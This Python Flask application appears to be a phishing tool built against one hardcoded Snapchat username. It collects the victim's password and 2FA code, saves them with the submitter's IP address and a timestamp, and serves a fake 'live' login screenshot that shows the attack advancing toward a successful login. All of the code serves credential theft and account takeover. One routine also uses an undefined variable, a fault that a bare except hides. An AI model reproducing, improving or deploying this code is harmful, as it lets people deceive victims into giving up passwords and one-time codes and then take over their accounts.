import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

session_state = {
    'started': False,
    'snapchat_loaded': False,
    'last_screenshot': None,
    'error': None,
    'is_fallback': True,
    'update_count': 0,
    'last_action': None,
    'stage': 'login',           # login | password_sent | 2fa | success
    'password_entered': False,
    'code_entered': False
}

def create_fresh_live_screenshot():
    """Generate a dynamic screenshot that shows progression based on stage"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#0a0a0f')
        draw = ImageDraw.Draw(img)

        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#aaaaaa'
        CARD = '#1a1a1f'
        FIELD = '#25252a'
        GREEN = '#22c55e'
        RED = '#ef4444'

        try:
            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 38)
            f_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
        except:
            f_huge = ImageFont.load_default()
            f_big = f_huge
            f_small = f_huge

        now = datetime.now()
        time_str = now.strftime("%H:%M:%S.%f")[:-3]
        session_state['update_count'] = session_state.get('update_count', 0) + 1
        rand = random.randint(100000, 999999)
        stage = session_state.get('stage', 'login')

        draw.rectangle([0, 0, width, height], fill='#0a0a0f')

        # Top status bar
        if stage == 'login':
            draw.rectangle([0, 0, width, 62], fill=RED)
            draw.text((20, 10), f"🔴 LIVE — LOGIN PAGE  |  {time_str}", fill='white', font=f_huge)
        elif stage == 'password_sent':
            draw.rectangle([0, 0, width, 62], fill='#f59e0b')  # orange
            draw.text((20, 10), f"🟠 LIVE — PASSWORD SENT, LOGGING IN...  |  {time_str}", fill='black', font=f_huge)
        elif stage == '2fa':
            draw.rectangle([0, 0, width, 62], fill='#3b82f6')  # blue
            draw.text((20, 10), f"🔵 LIVE — 2FA REQUIRED  |  {time_str}", fill='white', font=f_huge)
        else:
            draw.rectangle([0, 0, width, 62], fill=GREEN)
            draw.text((20, 10), f"🟢 LIVE — SUCCESS / LOGGED IN  |  {time_str}", fill='black', font=f_huge)

        # Main card
        cw, ch = 420, 480
        cx = (width - cw) // 2
        cy = 80
        draw.rounded_rectangle([cx, cy, cx + cw, cy + ch], radius=18, fill=CARD)

        draw.text((cx + 25, cy + 18), "Log in to Snapchat", fill=WHITE, font=f_big)

        # Username field
        draw.rounded_rectangle([cx + 25, cy + 58, cx + cw - 25, cy + 100], radius=10, fill=FIELD)
        draw.text((cx + 38, cy + 68), "zexoghaith", fill=WHITE, font=f_big)

        # Password field
        draw.rounded_rectangle([cx + 25, cy + 112, cx + cw - 25, cy + 154], radius=10, fill=FIELD)
        if session_state.get('password_entered'):
            draw.text((cx + 38, cy + 122), "••••••••••", fill='#22c55e', font=f_big)  # green = filled
            draw.text((cx + 280, cy + 122), "✓", fill=GREEN, font=f_big)
        else:
            draw.text((cx + 38, cy + 122), "••••••••••", fill=GRAY, font=f_big)

        # Log In button state
        by = cy + 175
        btn_color = '#666666' if stage in ['password_sent', '2fa'] else SNAP_YELLOW
        btn_text = "Logging in..." if stage == 'password_sent' else "Log In"
        draw.rounded_rectangle([cx + 25, by, cx + cw - 25, by + 50], radius=26, fill=btn_color)
        draw.text((cx + 115, by + 12), btn_text, fill='#000000' if stage != 'password_sent' else '#fff', font=f_big)

        # Social buttons (dimmed after password)
        alpha = 0.4 if stage != 'login' else 1.0
        draw.rounded_rectangle([cx + 25, by + 70, cx + cw - 25, by + 110], radius=26, fill=FIELD)
        draw.text((cx + 80, by + 80), "Continue with Google", fill=WHITE, font=f_small)

        draw.rounded_rectangle([cx + 25, by + 125, cx + cw - 25, by + 165], radius=26, fill=FIELD)
        draw.text((cx + 85, by + 135), "Continue with Apple", fill=WHITE, font=f_small)

        # === VERY OBVIOUS STAGE OVERLAYS ===
        if stage == 'password_sent':
            # Big orange banner across the card
            draw.rectangle([cx + 10, cy + 200, cx + cw - 10, cy + 420], fill='#3f2a00')
            draw.text((cx + 35, cy + 220), "PASSWORD ENTERED", fill='#f59e0b', font=f_huge)
            draw.text((cx + 35, cy + 270), "Clicking LOG IN...", fill=WHITE, font=f_big)
            draw.text((cx + 35, cy + 310), "Waiting for response / 2FA", fill=GRAY, font=f_small)
            
            # Gray out the button
            draw.rounded_rectangle([cx + 25, by, cx + cw - 25, by + 50], radius=26, fill='#444')
            draw.text((cx + 100, by + 12), "LOGGING IN...", fill='#999', font=f_big)

        if stage == '2fa':
            draw.rectangle([cx + 10, cy + 200, cx + cw - 10, cy + 420], fill='#1e3a8a')
            draw.text((cx + 50, cy + 215), "2FA CODE NEEDED", fill='#60a5fa', font=f_huge)
            draw.text((cx + 50, cy + 270), "Enter the 6-digit code", fill=WHITE, font=f_big)
            
            # Big 2FA input simulation
            draw.rounded_rectangle([cx + 40, cy + 310, cx + cw - 40, cy + 370], radius=10, fill='#1e40af')
            draw.text((cx + 70, cy + 325), "______", fill=WHITE, font=f_huge)
            if session_state.get('code_entered'):
                draw.text((cx + 70, cy + 325), code or "123456", fill=GREEN, font=f_huge)

        if stage == 'success':
            draw.rectangle([cx + 10, cy + 200, cx + cw - 10, cy + 420], fill='#052e16')
            draw.text((cx + 80, cy + 240), "✓ LOGGED IN!", fill=GREEN, font=f_huge)
            draw.text((cx + 60, cy + 300), "Session is now active", fill=WHITE, font=f_big)

        # Big proof elements
        draw.rounded_rectangle([20, 560, 460, 615], radius=10, fill=RED)
        draw.text((30, 570), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)

        draw.rounded_rectangle([20, 625, 580, 685], radius=10, fill=GREEN)
        draw.text((30, 635), f"TIME: {time_str}", fill='black', font=f_huge)

        draw.text((620, 645), f"RAND:{rand}", fill='#ff8800', font=f_big)

        draw.rectangle([0, height - 48, width, height], fill='#111')
        draw.text((15, height - 40), f"STAGE: {stage.upper()}  |  REGENERATED EVERY REQUEST", fill='#22c55e', font=f_big)

        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        session_state['last_screenshot'] = now.isoformat()
        return True
    except Exception as e:
        print(f"[FALLBACK] Error: {e}")
        try:
            from PIL import Image
            img = Image.new('RGB', (1280, 720), color=(20, 20, 25))
            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting live screenshot loop (fallback)...")
    create_fresh_live_screenshot()
    session_state['started'] = True
    session_state['is_fallback'] = True
    
    while True:
        create_fresh_live_screenshot()
        time.sleep(0.85)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {
        'user': HARDCODED_USER,
        'pass': password,
        'code': code,
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    
    # === VISUAL PROGRESSION (since no real browser) ===
    if password:
        session_state['password_entered'] = True
        session_state['stage'] = 'password_sent'
        session_state['last_action'] = 'password submitted + login clicked (visual)'
        print("[SUBMIT] Password received → showing 'password sent' state in live feed")
        create_fresh_live_screenshot()
        return jsonify({
            'status': 'ok',
            'filled': True,
            'message': 'Password sent. Live monitor now shows login in progress.',
            'stage': session_state['stage']
        })
    
    if code and len(code) >= 4:
        session_state['code_entered'] = True
        session_state['stage'] = '2fa'
        session_state['last_action'] = '2FA code submitted'
        print("[SUBMIT] 2FA code received → showing 2FA state")
        create_fresh_live_screenshot()
        return jsonify({
            'status': 'ok',
            'filled': True,
            'message': '2FA code sent. Check live monitor.',
            'stage': session_state['stage']
        })
    
    create_fresh_live_screenshot()
    return jsonify({'status': 'ok', 'filled': False})

@app.route('/screenshot')
def screenshot():
    create_fresh_live_screenshot()   # always fresh
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    response = send_from_directory(STATIC_DIR, 'screenshot.png')
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    return response

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat()
    })

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Screenshot thread started")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)